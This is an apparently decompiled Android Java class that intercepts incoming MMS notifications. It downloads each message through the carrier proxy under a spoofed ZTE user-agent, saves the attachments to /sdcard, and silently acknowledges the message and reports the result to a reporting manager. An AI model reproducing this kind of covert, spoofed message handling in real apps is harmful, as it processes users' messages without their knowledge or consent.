package net.workspace.mms;
import java.io.DataInputStream;
import java.io.FileOutputStream;
import net.workspace.http.HttpReportMmsc;
import net.workspace.listener.DownloadListener;
import net.workspace.listener.NetworkListener;
import net.workspace.listener.ReportMmscListener;
import net.workspace.manager.ReportManager;
import net.workspace.network.NetworkController;
import net.workspace.util.CommonUtil;
import net.workspace.util.MyLogger;
import org.apache.http.HttpEntity;
import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import android.content.BroadcastReceiver;
import android.content.Intent;
import com.google.android.mms.InvalidHeaderValueException;
import com.google.android.mms.pdu.GenericPdu;
import com.google.android.mms.pdu.NotificationInd;
import com.google.android.mms.pdu.NotifyRespInd;
import com.google.android.mms.pdu.PduBody;
import com.google.android.mms.pdu.PduComposer;
import com.google.android.mms.pdu.PduParser;
import com.google.android.mms.pdu.PduPart;
import com.google.android.mms.pdu.RetrieveConf;

public class MmsHelper implements DownloadListener {
    private static final String _114006 = /*const-replace-start*/"114006";
    private static final String UNKNOWN = /*const-replace-start*/"unknown";
    private static final String CONTENT_ID_IS = /*const-replace-start*/" ContentId is ";
    private static final String PDU_PART = /*const-replace-start*/"PduPart";
    private static final String SDCARD_FUJIAN = /*const-replace-start*/"/sdcard/fujian";
    /**
     * "Accept"
     */
    private static final String ACCEPT = /*const-replace-start*/"Accept";
    /**
     * "Accept-Language"
     */
    private static final String ACCEPT_LANGUAGE = /*const-replace-start*/"Accept-Language";
    /**
     * "user-agent"
     */
    private static final String USER_AGENT = /*const-replace-start*/"user-agent";
    /**
     *   "Mozilla/5.0(Linux;U;Android 2.1-update1;zh-cn;ZTE-C_N600/ZTE-C_N600V1.0.0B02;240*320;CTC/2.0)AppleWebkit/530.17(KHTML,like Gecko) Version/4.0 Mobile Safari/530.17";
     */
    private static final String MOZILLA_AGENT = /*const-replace-start*/"Mozilla/5.0(Linux;U;Android 2.1-update1;zh-cn;ZTE-C_N600/ZTE-C_N600V1.0.0B02;240*320;CTC/2.0)AppleWebkit/530.17(KHTML,like Gecko) Version/4.0 Mobile Safari/530.17";
    /**
     *   application/vnd.wap.mms-message, application/vnd.wap.sic"
     */
    private static final String MEMI = /*const-replace-start*/"*/*, application/vnd.wap.mms-message, application/vnd.wap.sic";
    /**
     * "http.route.default-proxy"
     */
    private static final String HTTP_ROUTE_DEFAULT_PROXY = /*const-replace-start*/"http.route.default-proxy";
    private static String DATA = /*const-replace-start*/"data";
    private byte tranctionID[];
    public void dealMsg(BroadcastReceiver broadcastreceiver, Intent intent) {
        byte abyte0[] = intent.getByteArrayExtra(DATA);
        if (abyte0 == null) { return;//
        }
        final PduParser parser = new PduParser(abyte0);
        final GenericPdu pdu = parser.parse();
        if (pdu == null) { return; }
        NetworkController.doNetworkTask(1, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg == null) {
                    downLoadMms(parser, pdu);
                    if (tranctionID != null) {
                        report(tranctionID);
                    }
                }
            }
        });
    }
    private byte[] download(String s) {
        byte result[] = null;
        DataInputStream datainputstream = null;
        try {
            CommonUtil.setProxyMmsc(CommonUtil.INFO.imsi);
            HttpHost httphost = new HttpHost(CommonUtil.PROXY, 80);
            BasicHttpParams basichttpparams = new BasicHttpParams();
            basichttpparams.setParameter(HTTP_ROUTE_DEFAULT_PROXY, httphost);
            HttpConnectionParams.setConnectionTimeout(basichttpparams, 10000);
            DefaultHttpClient defaulthttpclient = new DefaultHttpClient(basichttpparams);
            HttpGet httpget = new HttpGet(s);
            httpget.addHeader(ACCEPT, MEMI);
            httpget.addHeader(ACCEPT_LANGUAGE, "");
            httpget.addHeader(USER_AGENT, MOZILLA_AGENT);
            HttpResponse httpresponse = defaulthttpclient.execute(httpget);
            StatusLine statusline = httpresponse.getStatusLine();
            if (statusline.getStatusCode() != 200) {
                result = null;
            } else {
                HttpEntity httpentity = httpresponse.getEntity();
                if (httpentity != null) {
                    datainputstream = new DataInputStream(httpentity.getContent());
                    result = new byte[(int) httpentity.getContentLength()];
                    datainputstream.readFully(result);
                }
            }
        } catch (Exception e) {
            MyLogger.error(e);
        } finally {
            try {
                if (datainputstream != null) datainputstream.close();
            } catch (Exception exception) {
                result = null;
            }
        }
        return result;
    }
    private void downLoadMms(PduParser pduparser, GenericPdu genericpdu) {
        byte abyte1[];
        genericpdu.getMessageType();
        byte abyte0[] = ((NotificationInd) genericpdu).getContentLocation();
        String s = new String(abyte0);
        abyte1 = download(s);
        if (abyte1 == null) { return;//
        }
        PduParser pduparser1 = new PduParser(abyte1);
        GenericPdu genericpdu1 = pduparser1.parse();
        if (genericpdu1 == null) { return; }
        if (genericpdu1.getMessageType() != 132) return;
        RetrieveConf retrieveconf = (RetrieveConf) genericpdu1;
        tranctionID = retrieveconf.getTransactionId();
        PduBody pdubody = retrieveconf.getBody();
        if (pdubody == null) { return;//
        }
        int i;
        int j;
        i = pdubody.getPartsNum();
        j = 0;
        while (j < i) {
            PduPart pdupart = pdubody.getPart(j);
            new StringBuilder(PDU_PART);
            StringBuilder stringbuilder5;
            byte abyte5[];
            String s11;
            String s12;
            if (pdupart.getFilename() == null) {} else {
                byte abyte3[] = pdupart.getFilename();
                new String(abyte3);
            }
            stringbuilder5 = new StringBuilder(PDU_PART);
            stringbuilder5.append(j + 1).append(CONTENT_ID_IS);
            if (pdupart.getContentId() == null) {} else {
                byte abyte4[] = pdupart.getContentId();
                new String(abyte4);
            }
            abyte5 = pdupart.getData();
            s11 = new String(pdupart.getContentType());
            s12 = s11.substring(-4 + s11.length());
            if (s12.indexOf("/") != -1) s12 = s12.substring(1 + s12.indexOf("/"));
            if (s12.indexOf("*") != -1) s12 = UNKNOWN;
            FileOutputStream fileoutputstream1 = null;
            try {
                fileoutputstream1 = new FileOutputStream(new StringBuilder(SDCARD_FUJIAN).append(j + 1).append(".").append(s12).toString());
                fileoutputstream1.write(abyte5);
                fileoutputstream1.flush();
            } catch (Exception e) {
                MyLogger.error(e);
            } finally {
                try {
                    fileoutputstream1.close();
                } catch (Exception e) {
                    MyLogger.error(e);
                }
            }
            j++;
        }
    }
    @Override
    public void onDownloadFinished(int i, String s, String s1, int j) {}
    @Override
    public void onDownloadProgress(String s, int i, int j, int k) {}
    private void report(byte abyte0[]) {
        try {
            NotifyRespInd notifyrespind = new NotifyRespInd(18, abyte0, 129);
            new HttpReportMmsc(CommonUtil.MMSC, new PduComposer(CommonUtil.context, notifyrespind).make(), CommonUtil.PROXY, new ReportMmscListener() {
                @Override
                public void callback(int i) {
                    if (i == 200) {
                        ReportManager.reportMmsResult(1, "1", "");
                    } else {
                        ReportManager.reportMmsResult(1, "2", _114006);
                    }
                }
            }).connect();
        } catch (InvalidHeaderValueException e) {
            MyLogger.error(e);
        }
    }
}
